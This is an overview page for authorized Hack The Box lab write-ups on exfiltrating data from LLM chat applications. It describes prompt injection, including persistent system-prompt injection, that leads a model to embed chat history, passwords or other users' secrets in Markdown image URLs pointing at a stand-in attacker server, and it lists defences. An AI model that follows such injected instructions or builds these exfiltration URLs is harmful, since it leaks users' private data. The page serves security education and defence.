# Data Exfiltration

Data exfiltration in LLM applications refers to techniques that manipulate a model into disclosing sensitive information through its outputs or external requests. Unlike traditional data theft, LLM-based exfiltration can abuse the model's access to conversation history, system instructions, other users' messages or sensitive application context.

This section focuses on practical LLM output exfiltration techniques demonstrated through authorized Hack The Box Academy labs. The experiments use prompt injection and Markdown image syntax to create out-of-band exfiltration channels, causing the LLM or the application to generate HTTP requests containing sensitive information.

## Labs

| Lab | Technique | Target |
|---|---|---|
| [Exfiltration 1](./exfiltration-1.md) | Markdown-based exfiltration | Chat history |
| [Exfiltration 2](./exfiltration-2.md) | URL-based HTML injection | Password |
| [Exfiltration 3](./exfiltration-3.md) | Cross-user data exposure | Secret |
| [Exfiltration 4](./exfiltration-4.md) | Persistent system prompt injection | Password |

## Attack Concept

The core technique demonstrated throughout these labs is **out-of-band data exfiltration** through Markdown image rendering.

Instead of asking the LLM to directly reveal sensitive information in its response, the attacker instructs it to construct a Markdown image whose URL contains the target data:

```markdown
![x](http://ATTACKER_SERVER:8000/log?data=SENSITIVE_DATA)
````

When the generated Markdown is processed by the application, the image URL can cause an HTTP request to the attacker's server. The sensitive information is therefore transferred through the request URL rather than being displayed directly in the chatbot response.

The basic attack flow is:

```text
LLM
 │
 │ generates malicious Markdown
 ▼
![x](http://attacker-server/...?)
 │
 │ HTTP request
 ▼
Attacker-controlled HTTP server
 │
 │ logs request
 ▼
Exfiltrated data
```

A simple HTTP server can be used to observe these requests:

```bash
python3 -m http.server 8000
```

A `404 File not found` response is not necessarily a failure in this scenario. The important part is that the HTTP request reached the attacker-controlled server and the sensitive value appears in the request URL.

## Key Techniques

### Markdown-Based Exfiltration

Markdown image syntax can be abused as an indirect communication channel. The attacker embeds a remote URL and instructs the LLM to place sensitive information into a query parameter.

```markdown
![x](http://127.0.0.1:8000/log?data=...)
```

When the Markdown is rendered by the application, the external resource can trigger an HTTP request containing the exfiltrated information.

### Conversation History Exfiltration

LLMs may have access to previous messages within their conversation context. An attacker can manipulate the model into inserting previous messages into an externally requested URL.

This demonstrates why conversation history must be treated as sensitive model context rather than ordinary prompt content.

### Cross-User Data Exposure

In multi-user chat systems, conversation context may contain information belonging to multiple users. If conversation data is not properly isolated, prompt injection can potentially manipulate the model into disclosing another user's private information.

The critical security boundary is therefore not only the individual user's message but also **how conversation context is shared and isolated between users**.

### System Prompt Injection

System prompt injection occurs when malicious instructions are introduced into the system-level instructions that govern the LLM's behavior.

In Exfiltration 4, the malicious instruction was placed directly into the system prompt and instructed the model to include each user's message in a Markdown image URL. This allowed the exfiltration mechanism to persist across subsequent interactions.

### Persistent Exfiltration

A compromised system prompt can create a persistent exfiltration mechanism. Unlike a single user-level injection, a malicious system instruction can affect subsequent interactions processed using the compromised system prompt.

This increases the potential impact because multiple users can become targets of the same exfiltration mechanism.

## Security Impact

These labs demonstrate several security risks in LLM applications:

* Exposure of previous conversation messages
* Leakage of passwords and secrets
* Cross-user information disclosure
* Prompt injection through user-controlled content
* Abuse of Markdown rendering and external resource loading
* Persistent exfiltration through compromised system prompts
* Out-of-band data leakage that may not appear in the visible chatbot response

The fundamental issue is that **LLM output is not necessarily passive text**. When rendered or processed by an application, Markdown, HTML or other output formats can trigger secondary actions such as network requests.

## Defensive Considerations

LLM applications should treat generated output as untrusted data.

Relevant defensive controls include:

* Sanitize and constrain Markdown and HTML rendering
* Disable external resource loading where possible
* Apply network egress controls to LLM-facing applications
* Prevent LLM-generated URLs from accessing attacker-controlled destinations
* Isolate conversation contexts between users
* Protect system prompts and configuration sources from unauthorized modification
* Apply strict access controls to sensitive conversation data
* Monitor unexpected outbound HTTP requests
* Avoid placing secrets in model-accessible context unless necessary
* Treat prompt injection as an application security problem rather than only a model behavior problem

## Lab Environment

These experiments were performed in an authorized Hack The Box Academy environment.

The HTTP listener used for observing out-of-band requests:

```bash
python3 -m http.server 8000
```

The server logs incoming requests, allowing the exfiltrated data contained in URL parameters to be inspected.

## References

* Hack The Box Academy — LLM Output Attacks
* OWASP Top 10 for Large Language Model Applications
* OWASP GenAI Security Project
* MITRE ATLAS
